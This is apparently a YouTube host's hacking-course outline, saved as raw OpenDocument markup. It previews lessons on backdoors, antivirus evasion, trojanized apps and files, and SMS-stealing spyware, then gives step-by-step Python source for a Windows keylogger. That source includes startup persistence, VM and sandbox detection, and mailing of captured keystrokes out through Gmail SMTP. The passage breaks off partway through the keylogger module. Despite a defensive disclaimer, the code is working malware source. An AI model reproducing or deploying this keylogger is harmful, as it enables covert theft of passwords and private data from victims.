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3b160e"/>
    </style:style>
    <style:style style:name="T2"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3b160e"/>
    </style:style>
    <style:style style:name="T6"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2a6099"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties fo:font-size="12.00pt" fo:font-weight="bold" fo:font-family="'Liberation Serif'" style:font-family-asian="'Liberation Serif'" style:font-family-complex="'Liberation Serif'" fo:background-color="transparent" fo:color="#2a6099"/>
    </style:style>
    <style:style style:name="T8"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3b160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8.00pt" fo:font-weight="bold" fo:font-family="'Liberation Serif'" style:font-family-asian="'Liberation Serif'" style:font-family-complex="'Liberation Serif'" fo:background-color="#ffff00"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00a933" fo:color="#ffff00"/>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ff0000"/>
    </style:style>
    <style:style style:name="T15" style:family="text">
      <style:text-properties fo:font-size="18.00pt" fo:font-weight="bold" fo:font-family="'Liberation Serif'" style:font-family-asian="'Liberation Serif'" style:font-family-complex="'Liberation Serif'" fo:background-color="#ffffff" fo:color="#000000"/>
    </style:style>
    <style:style style:name="T16" style:family="text">
      <style:text-properties fo:font-size="18.00pt" fo:font-weight="bold" fo:font-family="'Liberation Serif'" style:font-family-asian="'Liberation Serif'" style:font-family-complex="'Liberation Serif'" fo:background-color="#ffffff" fo:color="#ff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ff0000"/>
    </style:style>
    <style:style style:name="T19" style:family="text">
      <style:text-properties fo:font-size="18.00pt" fo:font-weight="bold" fo:font-family="'Liberation Serif'" style:font-family-asian="'Liberation Serif'" style:font-family-complex="'Liberation Serif'" fo:background-color="#ffffff" fo:color="#ff0000"/>
    </style:style>
    <style:style style:name="T20" style:family="text">
      <style:text-properties fo:font-size="18.00pt" fo:font-weight="bold" fo:font-family="'Liberation Serif'" style:font-family-asian="'Liberation Serif'" style:font-family-complex="'Liberation Serif'" fo:background-color="#ffffff"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8.00pt" fo:font-weight="bold" fo:font-family="'Liberation Serif'" style:font-family-asian="'Liberation Serif'" style:font-family-complex="'Liberation Serif'" fo:background-color="#ffffff"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8.00pt" fo:font-weight="bold" fo:font-family="'Liberation Serif'" style:font-family-asian="'Liberation Serif'" style:font-family-complex="'Liberation Serif'" fo:background-color="#ffffff"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0000"/>
    </style:style>
    <style:style style:name="T27"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ff0000"/>
    </style:style>
    <style:style style:name="T28" style:family="text">
      <style:text-properties fo:font-size="18.00pt" fo:font-weight="bold" fo:font-family="'Liberation Serif'" style:font-family-asian="'Liberation Serif'" style:font-family-complex="'Liberation Serif'" fo:background-color="#ffffff" fo:color="#ff0000"/>
    </style:style>
    <style:style style:name="T29" style:family="text">
      <style:text-properties fo:font-size="18.00pt" fo:font-weight="bold" fo:font-family="'Liberation Serif'" style:font-family-asian="'Liberation Serif'" style:font-family-complex="'Liberation Serif'" fo:background-color="#ffffff" fo:color="#000000"/>
    </style:style>
    <style:style style:name="T30"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0000"/>
    </style:style>
    <style:style style:name="T31" style:family="text">
      <style:text-properties fo:font-size="18.00pt" fo:font-weight="bold" fo:font-family="'Liberation Serif'" style:font-family-asian="'Liberation Serif'" style:font-family-complex="'Liberation Serif'" fo:background-color="#ffffff" fo:color="#000000"/>
    </style:style>
    <style:style style:name="T32"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0000"/>
    </style:style>
    <style:style style:name="T33"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ff0000"/>
    </style:style>
    <style:style style:name="T34" style:family="text">
      <style:text-properties fo:font-size="18.00pt" fo:font-weight="bold" fo:font-family="'Liberation Serif'" style:font-family-asian="'Liberation Serif'" style:font-family-complex="'Liberation Serif'" fo:background-color="#ffffff" fo:color="#000000"/>
    </style:style>
    <style:style style:name="T35"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00a933" fo:color="#ffff00"/>
    </style:style>
    <style:style style:name="T36"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ff0000"/>
    </style:style>
    <style:style style:name="T37" style:family="text">
      <style:text-properties fo:font-size="18.00pt" fo:font-weight="bold" fo:font-family="'Liberation Serif'" style:font-family-asian="'Liberation Serif'" style:font-family-complex="'Liberation Serif'" fo:background-color="#ffffff" fo:color="#000000"/>
    </style:style>
    <style:style style:name="T38" style:family="text">
      <style:text-properties fo:font-size="18.00pt" fo:font-weight="bold" fo:font-family="'Liberation Serif'" style:font-family-asian="'Liberation Serif'" style:font-family-complex="'Liberation Serif'" fo:background-color="#ffffff" fo:color="#00b050"/>
    </style:style>
    <style:style style:name="T39" style:family="text">
      <style:text-properties fo:font-size="18.00pt" fo:font-weight="bold" fo:font-family="'Liberation Serif'" style:font-family-asian="'Liberation Serif'" style:font-family-complex="'Liberation Serif'" fo:background-color="#ffffff" fo:color="#ff0000"/>
    </style:style>
    <style:style style:name="T40" style:family="text">
      <style:text-properties fo:font-size="18.00pt" fo:font-weight="bold" fo:font-family="'Liberation Serif'" style:font-family-asian="'Liberation Serif'" style:font-family-complex="'Liberation Serif'" fo:background-color="#ffffff" fo:color="#00b050"/>
    </style:style>
    <style:style style:name="T41" style:family="text">
      <style:text-properties fo:font-size="18.00pt" fo:font-weight="bold" fo:font-family="'Liberation Serif'" style:font-family-asian="'Liberation Serif'" style:font-family-complex="'Liberation Serif'" fo:background-color="#ffffff" fo:color="#ff0000"/>
    </style:style>
    <style:style style:name="T42"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b050"/>
    </style:style>
    <style:style style:name="T43" style:family="text">
      <style:text-properties fo:font-size="18.00pt" fo:font-weight="bold" fo:font-family="'Liberation Serif'" style:font-family-asian="'Liberation Serif'" style:font-family-complex="'Liberation Serif'" fo:background-color="#ffffff" fo:color="#ff0000"/>
    </style:style>
    <style:style style:name="T4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b050"/>
    </style:style>
    <style:style style:name="T45" style:family="text">
      <style:text-properties fo:font-size="18.00pt" fo:font-weight="bold" fo:font-family="'Liberation Serif'" style:font-family-asian="'Liberation Serif'" style:font-family-complex="'Liberation Serif'" fo:background-color="#ffffff" fo:color="#ff0000"/>
    </style:style>
    <style:style style:name="T46"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b050"/>
    </style:style>
    <style:style style:name="T47" style:family="text">
      <style:text-properties fo:font-size="18.00pt" fo:font-weight="bold" fo:font-family="'Liberation Serif'" style:font-family-asian="'Liberation Serif'" style:font-family-complex="'Liberation Serif'" fo:background-color="#ffffff" fo:color="#ff0000"/>
    </style:style>
    <style:style style:name="T48"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b050"/>
    </style:style>
    <style:style style:name="T49" style:family="text">
      <style:text-properties fo:font-size="18.00pt" fo:font-weight="bold" fo:font-family="'Liberation Serif'" style:font-family-asian="'Liberation Serif'" style:font-family-complex="'Liberation Serif'" fo:background-color="#ffffff" fo:color="#ff0000"/>
    </style:style>
    <style:style style:name="T50"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b050"/>
    </style:style>
    <style:style style:name="T51" style:family="text">
      <style:text-properties fo:font-size="18.00pt" fo:font-weight="bold" fo:font-family="'Liberation Serif'" style:font-family-asian="'Liberation Serif'" style:font-family-complex="'Liberation Serif'" fo:background-color="#ffffff" fo:color="#ff0000"/>
    </style:style>
    <style:style style:name="T52"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b050"/>
    </style:style>
    <style:style style:name="T53" style:family="text">
      <style:text-properties fo:font-size="18.00pt" fo:font-weight="bold" fo:font-family="'Liberation Serif'" style:font-family-asian="'Liberation Serif'" style:font-family-complex="'Liberation Serif'" fo:background-color="#ffffff" fo:color="#ff0000"/>
    </style:style>
    <style:style style:name="T5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b050"/>
    </style:style>
    <style:style style:name="T55" style:family="text">
      <style:text-properties fo:font-size="18.00pt" fo:font-weight="bold" fo:font-family="'Liberation Serif'" style:font-family-asian="'Liberation Serif'" style:font-family-complex="'Liberation Serif'" fo:background-color="#ffffff" fo:color="#ff0000"/>
    </style:style>
    <style:style style:name="T56"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b050"/>
    </style:style>
    <style:style style:name="T57" style:family="text">
      <style:text-properties fo:font-size="18.00pt" fo:font-weight="bold" fo:font-family="'Liberation Serif'" style:font-family-asian="'Liberation Serif'" style:font-family-complex="'Liberation Serif'" fo:background-color="#ffffff" fo:color="#ff0000"/>
    </style:style>
    <style:style style:name="P1" style:family="paragraph">
      <style:paragraph-properties fo:line-height="115.00%" fo:text-align="center" fo:margin-bottom="7.00pt"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph">
      <style:paragraph-properties fo:line-height="100.00%" fo:text-align="center" fo:margin-top="10.00pt" fo:margin-bottom="6.00pt"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph">
      <style:paragraph-properties fo:line-height="115.00%" fo:text-align="center" fo:margin-bottom="7.00pt"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph">
      <style:paragraph-properties fo:line-height="115.00%" fo:text-align="left" fo:margin-bottom="7.00pt"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph">
      <style:paragraph-properties fo:line-height="100.00%" fo:text-align="center" fo:margin-top="10.00pt" fo:margin-bottom="6.00pt"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph">
      <style:paragraph-properties fo:line-height="115.00%" fo:text-align="center" fo:margin-bottom="7.00pt"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph">
      <style:paragraph-properties fo:line-height="115.00%" fo:text-align="left" fo:margin-bottom="7.00pt"/>
    </style:style>
    <style:style style:name="P8" style:family="paragraph">
      <style:paragraph-properties fo:line-height="115.00%" fo:text-align="center" fo:margin-bottom="7.00pt"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph">
      <style:paragraph-properties fo:line-height="115.00%" fo:text-align="left" fo:margin-bottom="7.00pt"/>
    </style:style>
    <style:style style:name="P10" style:family="paragraph">
      <style:paragraph-properties fo:line-height="115.00%" fo:text-align="center" fo:margin-bottom="7.00pt"/>
    </style:style>
    <style:style style:name="P11" style:family="paragraph">
      <style:paragraph-properties fo:line-height="115.00%" fo:text-align="left" fo:margin-bottom="7.00pt"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph">
      <style:paragraph-properties fo:line-height="115.00%" fo:text-align="left" fo:margin-bottom="7.00pt"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph">
      <style:paragraph-properties fo:line-height="115.00%" fo:text-align="left" fo:margin-bottom="7.00pt"/>
    </style:style>
    <style:style style:name="P14" style:family="paragraph">
      <style:paragraph-properties fo:line-height="115.00%" fo:text-align="left" fo:margin-bottom="7.00pt"/>
    </style:style>
    <style:style style:name="P15" style:family="paragraph">
      <style:paragraph-properties fo:line-height="115.00%" fo:text-align="left" fo:margin-bottom="7.00pt"/>
    </style:style>
    <style:style style:name="P16" style:family="paragraph">
      <style:paragraph-properties fo:line-height="115.00%" fo:text-align="left" fo:margin-bottom="7.00pt"/>
    </style:style>
    <style:style style:name="P17" style:family="paragraph">
      <style:paragraph-properties fo:line-height="115.00%" fo:text-align="left" fo:margin-bottom="7.00pt"/>
    </style:style>
    <style:style style:name="P18" style:family="paragraph">
      <style:paragraph-properties fo:line-height="115.00%" fo:text-align="left" fo:margin-bottom="7.00pt"/>
    </style:style>
    <style:style style:name="P19" style:family="paragraph">
      <style:paragraph-properties fo:line-height="115.00%" fo:text-align="left" fo:margin-bottom="7.00pt"/>
    </style:style>
    <style:style style:name="P20" style:family="paragraph">
      <style:paragraph-properties fo:line-height="115.00%" fo:text-align="left" fo:margin-bottom="7.00pt"/>
    </style:style>
    <style:style style:name="P21" style:family="paragraph">
      <style:paragraph-properties fo:line-height="115.00%" fo:text-align="left" fo:margin-bottom="7.00pt"/>
    </style:style>
  </office:automatic-styles>
  <office:body>
    <office:text>
      <text:p text:style-name="P1"><text:span text:style-name="T1">HOST: KIRUMIRA ISAAC</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">EMAIL:</text:span><text:a xlink:href="mailto:kirumiraisaacsoft@gmail.com"><text:span text:style-name="T3">kirumiraisaacsoft@gmail.com</text:span></text:a><text:span text:style-name="T4"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">CONTACT:+256759939936</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">YOUTUBE CHANNEL:freeeasyprogramming</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">YOUTUBE PLAY LIST LINK:</text:span></text:p>
      <text:p text:style-name="P1"><text:a xlink:href="https://youtube.com/playlist?list=PLDOYLawKMlBip6LPPogiebmu6x7JICS2l"><text:span text:style-name="T6">https://youtube.com/playlist?list=PLDOYLawKMlBip6LPPogiebmu6x7JICS2l</text:span></text:a><text:span text:style-name="T7"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T8">* INTRODUCTION TO THE SERIES</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T9"/></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T10">Note: These series are not to make you go out their hacking into peoples devices because its not legal and once you do it, you will be doing it on your own risk and you will face all the legal results out of it, you must know that you may die in jail for such activities and my goal here is to tell you how black heart hackers go into peoples system and I will recommend security measures people can take to avoid such people breaking into their systems.</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T12">* INTRODUCTION TO THE SERIES</text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="T13"/></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T14">1. KEY LOGGERS</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T15">I Will show you how to build a key logger from scratch using python programming language and I will show you how hackers can use such a program to hack into your windows<text:s text:c="2"/>or Linux system to steal your information.</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T16">A key logger is a program<text:s text:c="2"/>which when installed on your computer it will record all the keys you press on your keyboard and send then to the attacker's email address<text:s text:c="2"/>to analyze, it can steal your login credentials and give the hacker access to your personal accounts.</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T16">A key logger runs in the background of a target machine and it starts with system boot.</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T17"/></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T18">2. BACK DOORS</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T19">A backdoor is a program that when executed on a target computer it gives a hackers access to that computer or any other target device such as a mobile phone and now the hacker has full control over the hacked device.</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T20">If its a mobile phone a hacker can go ahead and send messages to people in your contact list with out your notice and those people will know that its you sending them such messages.</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T20">Note: Most back doors are detected by antivirus programs, I will show you how hackers create undetectable back doors that can bypass antivirus programs including windows defender which comes with windows and I will show you how to avoid such attacks.</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T20">We shall be using tools such as Venom, Fat rat, Veil E version, Termux , Metasploit to create such back doors.</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T21"/></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T22">Note: I will show you how a hacker can get a real app on market and inject a backdoor into that app and send it to you via the methods of social engineering we shall cover and once you install that app the hacker has got complete control over your device.</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T23"/></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T24">Note: I will show you how a hacker can get a PDF document or an image file and inject a backdoor into that file and send it to you via a link and once you click on that file the hacker has got complete control over your device with out you knowing.</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T25"/></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T26">3.<text:s/></text:span><text:span text:style-name="T27">SPY WARE APPS</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T28">A spyware<text:s text:c="2"/>is a software program that allows a hacker to obtain information about a target device.</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T29">Note: I will build a spy ware app in android that when installed on an android phone it will forward all text messages as they pop into that phone to a mobile phone of the hacker and I will explain what you should do in order to avoid such attacks cause through that attack your opt bank messages can be rooted to the hackers phone and you may end up losing money from your back account</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T30">NOTE:</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T31"><text:s/>I will be showing you how to make persistent<text:s text:c="2"/>backdoor.</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T31"><text:s/>I will be uploading these Hacking videos every Monday.</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T31">Please click on the subscribe button and don't forget to like in order to enable me to bring more cool staff. </text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T32">4.<text:s/></text:span><text:span text:style-name="T33">HOW HACKERS INTERCEPT TRAFFIC FROM MOBILE DEVICES</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T34">I will show how how a hacker can intercept traffic from mobile devices and websites as well as private APIS, to gain access to other peoples information.</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T34">For this we shall use tools such as Burp suite ,Fidera Every<text:s text:c="2"/>Where and wire shark.</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T34">Note: I will be providing you all the codes and commands we shall be using in this text document at the end of every tutorial<text:s text:c="3"/>in the description section.</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T35">* START UP ON OUR AGENDER</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T35"/></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T36">1.HOW HACKERS BUILD KEYLOGGERS </text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T37">Since this is not a course where we should be learning python, i hope you already know the python basics, so i have prepared and tested several scripts which am going to be using to show you how hackers do build key loggers and i will show you how to use these scripts to come up with a fully working keylogger.</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T37"/></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T38">Note:First create a text file and name it requirements.txt and put the following</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T39">pywin32</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T39">pynput</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T39">WMI</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T39">pyinstaller</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T40">Now run the following command to install the project requirements</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T40"><text:s/></text:span><text:span text:style-name="T41">python -m pip install -r requirements.txt</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T41">OR </text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T41">pip install -r requirements.txt</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T42">STEP1:</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T42">Create a new folder and inside that folder create a new file and name it main.py and put the following code, also a folder for the icon.</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T43">import sys, os, time</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T43">sys.path.append(os.pardir)</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T43">from src import persistence, tools</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T43">from src import exporter</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T43">from src.keylogger import keylogger</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T43">PATH = os.path.realpath(sys.argv[0])</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T43">APPDATA = os.environ["APPDATA"]</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T43">class main:</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T43"><text:s text:c="4"/>def __init__(self, timer, export_path="", add_to_startup=False, log_clicks=False, check_vm=False, check_sandboxie=False):</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T43"><text:s text:c="8"/>if persistence.instance_running(): sys.exit(0)</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T43"><text:s text:c="8"/>if check_vm and persistence.detect_vm(): sys.exit(0)</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T43"><text:s text:c="8"/>if check_sandboxie and persistence.detect_sandboxie(): sys.exit(0)</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T43"><text:s text:c="8"/>if add_to_startup: persistence.add_to_startup(APPDATA, PATH)</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T43"><text:s text:c="8"/>self.gmail = ""</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T43"><text:s text:c="8"/>self.gmail_pass = ""</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T43"><text:s text:c="8"/>self.timer = timer</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T43"><text:s text:c="8"/>self.export_path = tools.get_env_var(export_path)</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T43"><text:s text:c="8"/>self.current_file_path = os.path.realpath(sys.argv[0])</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T43"><text:s text:c="8"/>self.keylogger = keylogger(log_clicks)</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T43"><text:s text:c="4"/>def override_gmail(self, gmail, gmail_pass):</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T43"><text:s text:c="8"/>self.gmail = gmail</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T43"><text:s text:c="8"/>self.gmail_pass = gmail_pass</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T43"><text:s text:c="4"/>def start(self):</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T43"><text:s text:c="8"/>self.keylogger.start()</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T43"><text:s text:c="8"/>while True:</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T43"><text:s text:c="12"/>time.sleep(self.timer)</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T43"><text:s text:c="12"/>if not self.keylogger.keylogger_running: break</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T43"><text:s text:c="12"/>key_log = self.keylogger.get_key_log()</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T43"><text:s text:c="12"/>if key_log != "":</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T43"><text:s text:c="16"/>if self.gmail == "":</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T43"><text:s text:c="20"/>if exporter.save_text_locally(key_log, self.export_path):</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T43"><text:s text:c="24"/>self.keylogger.clear_key_log()</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T43"><text:s text:c="16"/>else:</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T43"><text:s text:c="20"/>if exporter.send_gmail(key_log, self.gmail, self.gmail_pass):</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T43"><text:s text:c="24"/>self.keylogger.clear_key_log()</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T43">if __name__ == "__main__": main = main(600, "%userprofile%\log.txt", False, False, False, False);main.start()</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T43"/></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T44">STEP2:</text:span></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T44">Inside your folder create a new folder and name it src and inside it create a file and name it exporter.py and put the following code.</text:span></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T44"/></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T45">import smtplib, time</text:span></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T45">def save_text_locally(text, file_path):</text:span></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T45"><text:s text:c="4"/>try:</text:span></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T45"><text:s text:c="8"/>file = open(file_path, "r")</text:span></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T45"><text:s text:c="8"/>file.close()</text:span></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T45"><text:s text:c="8"/>file = open(file_path, "a", encoding="utf-8")</text:span></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T45"><text:s text:c="4"/>except:</text:span></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T45"><text:s text:c="8"/>try:</text:span></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T45"><text:s text:c="12"/>file = open(file_path, "a", encoding="utf-8")</text:span></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T45"><text:s text:c="12"/>file.write("-"*10 + "{0} {1}".format(time.strftime("%d/%m/%Y"), time.strftime("%I:%M:%S")) + "-"*10 + "\n")</text:span></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T45"><text:s text:c="8"/>except:</text:span></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T45"><text:s text:c="12"/>return False</text:span></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T45"><text:s text:c="4"/>file.write("")</text:span></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T45"><text:s text:c="4"/>file.write(text)</text:span></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T45"><text:s text:c="4"/>file.close()</text:span></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T45"><text:s text:c="4"/>return True</text:span></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T45">def send_gmail(text, email, password):</text:span></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T45"><text:s text:c="4"/>email_content = "Subject: {}\n\n{}".format(f"TestKeyLogs", text)</text:span></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T45"><text:s text:c="4"/>try:</text:span></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T45"><text:s text:c="8"/>smtp_server = smtplib.SMTP_SSL("smtp.gmail.com", 465)</text:span></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T45"><text:s text:c="8"/>smtp_server.ehlo()<text:s text:c="2"/># identifies you to the smtp server</text:span></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T45"><text:s text:c="8"/>smtp_server.login(email, password)</text:span></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T45"><text:s text:c="8"/>smtp_server.sendmail(email, email, email_content)</text:span></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T45"><text:s text:c="8"/>smtp_server.close()</text:span></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T45"><text:s text:c="8"/>return True</text:span></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T45"><text:s text:c="4"/>except:</text:span></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T45"><text:s text:c="8"/>return False</text:span></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T46">STEP3:</text:span></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T46">Inside your folder create a new file inside src and name it keylogger.py and put the following code.</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T47"/></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T47">import threading, pynput.keyboard, pynput.mouse</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T47">from win32gui import GetWindowText, GetForegroundWindow</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T47">KEY = pynput.keyboard.Key</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T47">class keylogger:</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T47"><text:s text:c="4"/>def __init__(self, log_clicks=False, escape_combo=(KEY.shift, KEY.f1)):</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T47"><text:s text:c="8"/>self.key_log = ""</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T47"><text:s text:c="8"/>self.keylogger_running = False</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T47"><text:s text:c="8"/>self.key_combo = []</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T47"><text:s text:c="8"/>self.escape_combo = list(escape_combo)</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T47"><text:s text:c="8"/>self.key_listener = pynput.keyboard.Listener(on_press=self.on_keyboard_event)</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T47"><text:s text:c="8"/>self.log_clicks = log_clicks</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T47"><text:s text:c="8"/>if log_clicks: self.mouse_listener = pynput.mouse.Listener(on_click=self.on_click_event); self.window = ""</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T47"><text:s text:c="4"/>def start(self):</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T47"><text:s text:c="8"/>self.key_listener.start()</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T47"><text:s text:c="8"/>self.keylogger_running = True</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T47"><text:s text:c="8"/>if self.log_clicks: self.mouse_listener.start()</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T47"><text:s text:c="4"/>def get_key_log(self):</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T47"><text:s text:c="8"/>return self.key_log</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T47"><text:s text:c="4"/>def clear_key_log(self):</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T47"><text:s text:c="8"/>self.key_log = ""</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T47"><text:s text:c="4"/>def stop_key_logger(self):</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T47"><text:s text:c="8"/>self.key_listener.stop()</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T47"><text:s text:c="8"/>self.keylogger_running = False</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T47"><text:s text:c="8"/>threading.Thread.__init__(self.key_listener)</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T47"><text:s text:c="8"/>if self.log_clicks: self.mouse_listener.stop(); threading.Thread.__init__(self.mouse_listener)</text:span></text:p>
